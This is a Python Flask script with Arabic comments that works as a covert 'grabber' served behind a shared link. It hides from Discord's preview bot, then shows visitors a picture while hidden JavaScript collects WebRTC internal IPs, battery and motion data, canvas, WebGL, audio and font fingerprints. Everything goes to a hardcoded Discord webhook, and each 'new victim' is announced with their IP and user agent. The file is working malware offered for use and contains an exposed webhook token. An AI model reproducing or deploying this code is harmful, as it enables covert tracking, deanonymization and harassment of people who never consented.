from flask import Flask, request
import requests, base64, json, hashlib

app = Flask(__name__)

# ←← غيّر الويب هوك ده
WEBHOOK = "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C"

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def silent_grabber(path):
    ip = request.headers.get('X-Forwarded-For', 'Unknown').split(',')[0]
    ua = request.headers.get('User-Agent', '')

    if 'Discordbot' in ua:
        fake = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==')
        return fake, 200, {'Content-Type': 'image/png'}

    html = f"""<!DOCTYPE html>
<html><body style="margin:0;background:#111">
<img src="https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg" style="width:100%;height:100vh;object-fit:contain">

<script>
// 1. WebRTC mDNS (اسم الجهاز + IP داخلي)
const pc = new RTCPeerConnection({{iceServers:[]}});
pc.createDataChannel('');
pc.createOffer().then(o=>pc.setLocalDescription(o));
pc.onicecandidate = e => {{
  if (e.candidate && e.candidate.candidate.includes('host')) {{
    fetch('{WEBHOOK}?mdns=' + e.candidate.candidate);
  }}
}};

// 2. Battery API
navigator.getBattery().then(b => {{
  fetch('{WEBHOOK}?battery=' + b.level + '|' + b.charging);
}});

// 3. Sensors (حركة الجوال)
window.addEventListener('devicemotion', e => {{
  fetch('{WEBHOOK}?motion=real_user');
}}, {{once:true}});

// 4. Canvas + WebGL Fingerprint
const canvas = document.createElement('canvas');
const ctx = canvas.getContext('2d');
ctx.fillText('فنگرپرنت', 2, 15);
const webgl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
const debugInfo = webgl?.getExtension('WEBGL_debug_renderer_info');
const fingerprint = canvas.toDataURL() + '|' + (webgl?.getParameter(webgl.RENDERER) || '') + '|' + (debugInfo ? webgl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : '');
fetch('{WEBHOOK}?fp=' + btoa(fingerprint));

// 5. AudioContext Fingerprint
const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
const oscillator = audioCtx.createOscillator();
oscillator.frequency.value = 10000;
const analyser = audioCtx.createAnalyser();
oscillator.connect(analyser);
analyser.connect(audioCtx.destination);
oscillator.start(0);
setTimeout(() => {{
  const data = new Uint8Array(analyser.frequencyBinCount);
  analyser.getByteFrequencyData(data);
  fetch('{WEBHOOK}?audio=' + btoa(String.fromCharCode.apply(null, data)));
  oscillator.stop();
}}, 100);

// 6. Font Enumeration
const fonts = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana', 'Comic Sans MS', 'Impact', 'Trebuchet MS'];
let detected = '';
fonts.forEach(f => {{
  const el = document.createElement('span');
  el.style.fontFamily = f;
  el.innerHTML = 'mmmmmmmmmmlllliiiiii';
  document.body.appendChild(el);
  if (el.offsetWidth !== 0) detected += f + ',';
  el.remove();
}});
fetch('{WEBHOOK}?fonts=' + detected);

</script>
</body></html>"""

    # إشعار أولي
    requests.post(WEBHOOK, json={"content": f"@everyone ضحية جديدة silent 100%\nIP: {ip}\nUA: {ua[:100]}"})
    return html

if __name__ == "__main__":
    app.run()
